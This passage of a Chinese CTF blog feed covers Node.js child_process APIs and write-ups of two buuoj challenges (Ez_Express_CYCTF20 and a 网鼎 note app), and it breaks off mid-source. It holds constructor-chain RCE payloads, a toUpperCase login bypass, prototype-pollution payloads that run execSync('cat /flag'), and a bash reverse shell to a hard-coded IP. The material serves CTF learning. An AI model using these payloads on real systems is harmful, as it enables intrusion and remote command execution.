命令行参数不用放到command里了</p><ol><li>如果中间数据过多也会阻塞，详见api文档</li></ol> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;spawn&#125;  = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> spawnObj = <span class="title function_">spawn</span>(<span class="string">&#x27;ping&#x27;</span>, [<span class="string">&#x27;127.0.0.1&#x27;</span>], &#123;<span class="attr">encoding</span>: <span class="string">&#x27;utf-8&#x27;</span>&#125;);</span><br><span class="line">spawnObj.<span class="property">stdout</span>.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="keyword">function</span>(<span class="params">chunk</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(chunk.<span class="title function_">toString</span>());</span><br><span class="line">&#125;);</span><br><span class="line">spawnObj.<span class="property">stderr</span>.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="function">(<span class="params">data</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(data);</span><br><span class="line">&#125;);</span><br><span class="line">spawnObj.<span class="title function_">on</span>(<span class="string">&#x27;close&#x27;</span>, <span class="keyword">function</span>(<span class="params">code</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;close code : &#x27;</span> + code);</span><br><span class="line">&#125;)</span><br><span class="line">spawnObj.<span class="title function_">on</span>(<span class="string">&#x27;exit&#x27;</span>, <span class="function">(<span class="params">code</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;exit code : &#x27;</span> + code);</span><br><span class="line">    fs.<span class="title function_">close</span>(fd, <span class="keyword">function</span>(<span class="params">err</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(err) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">error</span>(err);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li><li><p>option中有一个shell</p><ol><li>如果启用了shell选项，请勿将未经处理的用户输入传递给此函数。任何包含 shell 元字符的输入都可用于触发任意命令执行</li><li><code>shell &lt;boolean&gt; | &lt;string&gt;</code>如果为true ，则在 shell 内运行command 。在 Unix 上使用’&#x2F;bin&#x2F;sh’ ，在 Windows 上使用process.env.ComSpec 。可以将不同的 shell 指定为字符串。请参阅Shell 要求和默认 Windows shell(在api文档中)。默认值： false （无 shell）</li></ol></li></ol></li><li><code>child_process.spawnSync(command[, args][, options])</code><ol><li>和<code>child_process.execSync()</code>更相似一点</li><li>区别<ol><li>execSync: 可以解析 shell 特性（如管道、重定向等），一次执行复杂命令</li><li>spawnSync:  直接执行指定的可执行文件，不通过 shell。因此，它不能解析 shell 特性，安全性更好 –&gt; <strong>指定shell字符时可以(chat一下就好)</strong></li></ol></li></ol></li></ol><h5 id="3-child-process-execFile-Sync-file-args-options-callback"><a href="#3-child-process-execFile-Sync-file-args-options-callback" class="headerlink" title="3. child_process.execFile[Sync](file[, args][, options][, callback])"></a>3. <code>child_process.execFile[Sync](file[, args][, options][, callback])</code></h5><ol><li><code>child_process.execFile[Sync](file[, args][, options][, callback])</code><ol><li>执行一个可执行文件，可以通过shell参数来执行命令<ol><li>默认不通过shell，这意味着你不能利用 shell 的功能，比如 I&#x2F;O 重定向和管道 –&gt; <code>execFile(&#39;/bin/ls&#39;, [&#39;-la&#39;])</code> 会直接调用 <code>/bin/ls</code> 并传递 <code>-la</code> 参数</li></ol></li><li><strong>要求</strong><ol><li><p>被执行的文件一定要有可执行权限，如果是类似.py类的特定语言的脚本，一定在开头指定解释器程序路径</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; execFile &#125; = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 指定 Python 解释器的路径和脚本路径</span></span><br><span class="line"><span class="keyword">const</span> pythonPath = <span class="string">&#x27;/usr/bin/python3&#x27;</span>; <span class="comment">// 或者你系统中 Python 的实际路径</span></span><br><span class="line"><span class="keyword">const</span> scriptPath = <span class="string">&#x27;./script.py&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> args = [<span class="string">&#x27;arg1&#x27;</span>, <span class="string">&#x27;arg2&#x27;</span>];</span><br><span class="line"><span class="title function_">execFile</span>(pythonPath, [scriptPath, ...args], <span class="function">(<span class="params">error, stdout, stderr</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (error) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">`执行出错: <span class="subst">$&#123;error&#125;</span>`</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`stdout: <span class="subst">$&#123;stdout&#125;</span>`</span>);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">`stderr: <span class="subst">$&#123;stderr&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li></ol></li></ol></li></ol><h5 id="4-child-process-fork-modulePath-args-options"><a href="#4-child-process-fork-modulePath-args-options" class="headerlink" title="4. child_process.fork(modulePath[, args][, options])"></a>4. <code>child_process.fork(modulePath[, args][, options])</code></h5><ol><li><code>fork()</code> 函数可用于创建一个新的 Node.js 进程，该进程与父进程共享相同的内存空间。这意味着<strong>父进程和子进程可以相互通信并访问彼此的变量和函数</strong><ol><li>与child_process.spawn()类似，返回一个ChildProcess对象。返回的ChildProcess将有一个额外的内置通信通道，允许消息在父进程和子进程之间来回传递 –&gt; 详见api文档</li><li>派生的Node.js子进程独立于父进程，但两者之间建立的IPC通信通道除外。每个进程都有自己的内存和V8实例。由于需要额外的资源分配，不建议生成大量的子Node.js进程</li></ol></li><li><strong>无法执行任意命令</strong>: child_process.fork()不支持child_process.spawn()中可用的shell选项，如果设置该选项，则将被忽略</li></ol><h5 id="补充的外部module"><a href="#补充的外部module" class="headerlink" title="补充的外部module"></a>补充的外部module</h5><ol><li>shelljs module from npm</li><li>simple-git</li></ol><h2 id="RCE-Tricks"><a href="#RCE-Tricks" class="headerlink" title="*RCE Tricks"></a>*RCE Tricks</h2><h3 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h3><h3 id="原型链constructor构造载体"><a href="#原型链constructor构造载体" class="headerlink" title="原型链constructor构造载体"></a>原型链constructor构造载体</h3><h4 id="IIFE和Function"><a href="#IIFE和Function" class="headerlink" title="IIFE和Function"></a>IIFE和Function</h4><ol><li>在js中所有函数对象都是通过Function构造函数创建的 –&gt; 函数对象的<code>func.__proto__.constructor==Function</code>(通过原型链直接<code>func.constructor也是</code>)</li><li><strong>利用思路</strong>: 使用Function()来实现任意函数，并且通过抬手可得的原始类型(与包装对象有自动转换机制，<strong>自动装箱和拆箱</strong>)获取Function，这里以<code>Number</code>为例子<ol><li>Number.prototype 是所有 Number 实例的原型</li><li>Number 本身是一个函数，它的原型是 <code>Function.prototype</code></li><li>通过<code>(1).constructor.constructor</code>访问到<code>Function</code>对象</li></ol></li><li><em><strong><code>Function</code>对象</strong></em><ol><li><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function">mdn Function</a></li><li><code>Function([arg1, arg2, ..., argN], functionBody)</code>可以构造<code>Function(&#39;a&#39;, &#39;b&#39;, &#39;return a + b;&#39;);</code></li></ol></li><li>*<strong>立即调用函数表达式IIFE</strong><ol><li><p>作用: 创建一个独立的作用域，以避免变量污染全局命名空间。IIFE 可以有效地封装变量和函数，使其对外部不可见</p></li><li><p>js两种调用形式</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// 函数体</span></span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line">(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 函数体</span></span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure></li></ol></li></ol><h4 id="constructor-payload"><a href="#constructor-payload" class="headerlink" title="constructor payload"></a>constructor payload</h4><ol><li>CJS版本<ol><li><code>(1).constructor.constructor(&quot;return require(&#39;child_process&#39;).execSync(&#39;whoami&#39;).toString();&quot;)();</code></li><li><code>(1).constructor.constructor(&#39;return require(&quot;child_process&quot;).execSync(`\x64\x69\x72`).toString();&#39;)();</code> –&gt; 当exec中为十六进制时，要把单引号’改成反引号&#96;这里是js模板字符串</li></ol></li><li>ES6版本<ol><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Modules#%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E6%A8%A1%E5%9D%97">mdn 动态加载模块</a></li><li><code>(1).constructor.constructor(&quot;return import(&#39;child_process&#39;).then(cp=&gt;&#123;cp.exec(&#39;cat /flag&#39;);&#125;);&quot;)();</code></li></ol></li><li>实际操作可以写一个探测脚本，现在没必要</li></ol><h3 id="PP2RCE"><a href="#PP2RCE" class="headerlink" title="PP2RCE"></a>PP2RCE</h3><ol><li>详见recurrence: SycServer2_SCTF24</li></ol><h3 id="global-process-mainModule-constructor-load"><a href="#global-process-mainModule-constructor-load" class="headerlink" title="global.process.mainModule.constructor._load"></a>global.process.mainModule.constructor._load</h3><h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><ol><li>nodejs基础<ol><li><a href="https://www.runoob.com/nodejs/nodejs-tutorial.html">菜鸟教程</a></li><li><a href="https://liaoxuefeng.com/books/javascript/nodejs/">廖雪峰</a></li><li>可以看看，感觉不错，其中具体模块可以看看api文档这些<a href="https://juejin.cn/post/7218117377053098039">系列专栏</a></li><li>其他核心概念：模块、事件驱动架构、异步 I&#x2F;O、流、缓冲区、全局对象、Node.js 运行时、节点包管理器 (npm)、事件循环、中间件和错误处理</li></ol></li><li>具体执行命令<ol><li>官方<a href="https://nodejs.org/api/child_process.html">api文档</a></li><li>看看学过人怎么讲<a href="https://segmentfault.com/a/1190000045261949#item-3-2">child_process</a></li><li><a href="https://blog.csdn.net/cindy647/article/details/108830841">外置模块</a></li><li>可以多查查绕过</li></ol></li><li>nodejs漏洞利用<ol><li><a href="https://hackerqwq.github.io/2021/04/20/nodejs%E5%88%A9%E7%94%A8%E5%B0%8F%E6%80%BB%E7%BB%93/#eval%E5%AF%BC%E8%87%B4%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C">个人博客，很不错的一篇，点很多</a></li><li><a href="https://wiki.scuctf.com/ctfwiki/web/1.nodejs/nodejs/">川大ctf wiki</a></li></ol></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Node安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ez_Express_CYCTF20</title>
      <link href="/2024/10/30/Ez_Express_CYCTF20/"/>
      <url>/2024/10/30/Ez_Express_CYCTF20/</url>
      
        <content type="html"><![CDATA[<blockquote><p>复现平台: buuoj</p></blockquote><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><ol><li>抓包看源码，发现<a href="http://www.zip,阅读发现关键文件index.js/">www.zip，阅读发现关键文件index.js</a><ol><li>用户数据存储在req.session.user中</li><li>流程<ol><li>导航到&#x2F;未登录重定向到&#x2F;login页面，通过res来进行渲染</li><li>结合1要登录admin用户会检查req.session.user的信息是否匹配，又无法获取admin的密码 -&gt; 但是有一个可能，<strong>覆盖</strong>？通过注册实现，但是有安全检查，等下再绕过，看看搞不搞得通<ol><li>思路1<ol><li>登录admin后传<strong>body污染原型链</strong>，原型链只能在登录后进行污染</li><li>获取信息，带外(需要命令执行)&#x2F;回显(难，没法读文件)，这里肯定要读文件，可不可以进行命令执行 -&gt; 通过原型链污染后新建的对象都会有某个属性，将某个属性设置为一个函数，<strong>执行命令</strong>，理论可行，可以执行命令直接看反弹shell，不出网就用回显处理(类似wangding24 web02)</li></ol></li><li>思路1待解决<ol><li>覆盖需要绕过，match()绕过，处理match还对username**进行了什么处理(从处理想对策)**，可能有用？toUpperCase()？<ol><li><a href="https://f1veseven.github.io/2022/04/03/ctf-nodejs-zhi-yi-xie-xiao-zhi-shi/">toUpperCase</a>，可以进行绕过，这里node漏洞的</li></ol></li><li>命令执行部分使用shell.js可以一试，需要找到一个对象访问它的属性但是被覆盖 -&gt; 先访问&#x2F;action在访问&#x2F;info有res.outputFunctionName(在&#x2F;目录中的和&#x2F;action中的不一样)，通过<code>&#123;&quot;__proto__&quot;: &#123;&quot;outputFunctionName&quot;: function() &#123;命令执行实现&#125;&#125;</code><ol><li><a href="https://f1veseven.github.io/2022/04/03/ctf-nodejs-zhi-yi-xie-xiao-zhi-shi/">nodejs</a></li></ol></li></ol></li></ol></li></ol></li></ol></li></ol><h2 id="index-js"><a href="#index-js" class="headerlink" title="index.js"></a>index.js</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">isObject</span> = obj =&gt; obj &amp;&amp; obj.<span class="property">constructor</span> &amp;&amp; obj.<span class="property">constructor</span> === <span class="title class_">Object</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">merge</span> = (<span class="params">a, b</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> attr <span class="keyword">in</span> b) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_">isObject</span>(a[attr]) &amp;&amp; <span class="title function_">isObject</span>(b[attr])) &#123;</span><br><span class="line">      <span class="title function_">merge</span>(a[attr], b[attr]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      a[attr] = b[attr];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> a</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">clone</span> = (<span class="params">a</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">merge</span>(&#123;&#125;, a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">safeKeyword</span>(<span class="params">keyword</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span>(keyword.<span class="title function_">match</span>(<span class="regexp">/(admin)/i</span>s)) &#123;</span><br><span class="line">      <span class="keyword">return</span> keyword</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">undefined</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span>(!req.<span class="property">session</span>.<span class="property">user</span>)&#123;</span><br><span class="line">    res.<span class="title function_">redirect</span>(<span class="string">&#x27;/login&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  res.<span class="property">outputFunctionName</span>=<span class="literal">undefined</span>;</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>,data=&#123;<span class="string">&#x27;user&#x27;</span>:req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">user</span>&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;login&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span>(req.<span class="property">body</span>.<span class="property">Submit</span>==<span class="string">&quot;register&quot;</span>)&#123;</span><br><span class="line">   <span class="keyword">if</span>(<span class="title function_">safeKeyword</span>(req.<span class="property">body</span>.<span class="property">userid</span>))&#123;</span><br><span class="line">    res.<span class="title function_">end</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;forbid word&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>) </span><br><span class="line">   &#125;</span><br><span class="line">    req.<span class="property">session</span>.<span class="property">user</span>=&#123;</span><br><span class="line">      <span class="string">&#x27;user&#x27;</span>:req.<span class="property">body</span>.<span class="property">userid</span>.<span class="title function_">toUpperCase</span>(),</span><br><span class="line">      <span class="string">&#x27;passwd&#x27;</span>: req.<span class="property">body</span>.<span class="property">pwd</span>,</span><br><span class="line">      <span class="string">&#x27;isLogin&#x27;</span>:<span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>); </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span>(req.<span class="property">body</span>.<span class="property">Submit</span>==<span class="string">&quot;login&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!req.<span class="property">session</span>.<span class="property">user</span>)&#123;res.<span class="title function_">end</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;register first&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)&#125;</span><br><span class="line">    <span class="keyword">if</span>(req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">user</span>==req.<span class="property">body</span>.<span class="property">userid</span>&amp;&amp;req.<span class="property">body</span>.<span class="property">pwd</span>==req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">passwd</span>)&#123;</span><br><span class="line">      req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">isLogin</span>=<span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">      res.<span class="title function_">end</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;error passwd&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">  res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>); ;</span><br><span class="line">&#125;);</span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/action&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span>(req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">user</span>!=<span class="string">&quot;ADMIN&quot;</span>)&#123;res.<span class="title function_">end</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;ADMIN is asked&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)&#125; </span><br><span class="line">  req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">data</span> = <span class="title function_">clone</span>(req.<span class="property">body</span>);</span><br><span class="line">  res.<span class="title function_">end</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;success&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>);  </span><br><span class="line">&#125;);</span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/info&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>,data=&#123;<span class="string">&#x27;user&#x27;</span>:res.<span class="property">outputFunctionName</span>&#125;);</span><br><span class="line">&#125;)</span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure><h2 id="修正"><a href="#修正" class="headerlink" title="*修正"></a>*修正</h2><ol><li>思路没有错就胜利很多了</li><li>fix1: 这里的<strong>访问属性调用函数有问题</strong><ol><li>payload<code>&#123;&quot;lua&quot;:&quot;123&quot;,&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;t=1;return global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;cat /flag&#39;).toString()//&quot;&#125;,&quot;Submit&quot;:&quot;&quot;&#125;</code>这样来调用，插入模板进行调用，反而如果直接定义函数的的话无法被调用</li></ol></li><li>fix2: 注意传输json对象时要<strong>修改content-type: application&#x2F;json</strong></li></ol><h2 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h2><ol><li>注册<code>admın</code>成功进行覆盖</li><li>访问<code>/action</code>并进行覆盖，payload<code>&#123;&quot;lua&quot;:&quot;123&quot;,&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;t=1;return global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;cat /flag&#39;).toString()//&quot;&#125;,&quot;Submit&quot;:&quot;&quot;&#125;</code></li><li>访问<code>/info</code></li></ol><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol><li>几个核心思想<ol><li>读文件一般需要命令或者包含</li><li>进行了什么处理(从处理想对策)如uppercase</li><li>这种源码路由题还是先从路由再到细节想思路，不会太跳跃</li></ol></li><li>ref<ol><li><a href="https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html">p神的js toUpperCase绕过</a></li><li><a href="https://f1veseven.github.io/2022/04/03/ctf-nodejs-zhi-yi-xie-xiao-zhi-shi/">nodejs</a></li></ol></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> recurrence </tag>
            
            <tag> Node安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>notes_网鼎20</title>
      <link href="/2024/10/30/notes_%E7%BD%91%E9%BC%8E20/"/>
      <url>/2024/10/30/notes_%E7%BD%91%E9%BC%8E20/</url>
      
        <content type="html"><![CDATA[<blockquote><p>复现平台: buuoj</p></blockquote><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li>分析源码，目标肯定是&#x2F;status的地方<ol><li><code>let in</code>语句<strong>可以读取原型链的内容</strong>，构造payload<code>&quot;rce&quot;: &quot;ls&quot;</code> –&gt; <strong>需要考虑进行带外，因为是输出到标准输出</strong></li><li>可以考虑构造原型链到Object里，有两个目标<ol><li><p>一个是edit_note</p>   <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// payloads，可以使用反弹shell实现，本地nc -lvnp 8080</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;id&quot;</span>:<span class="string">&quot;__proto__.b&quot;</span>,</span><br><span class="line">    <span class="string">&quot;author&quot;</span>: <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/8.218.92.67/8080 0&gt;&amp;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;raw&quot;</span> : <span class="string">&quot;h3110 w0r1d&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>一个是write_note</p></li></ol></li></ol></li></ol><h2 id="直接源码"><a href="#直接源码" class="headerlink" title="直接源码"></a>直接源码</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span 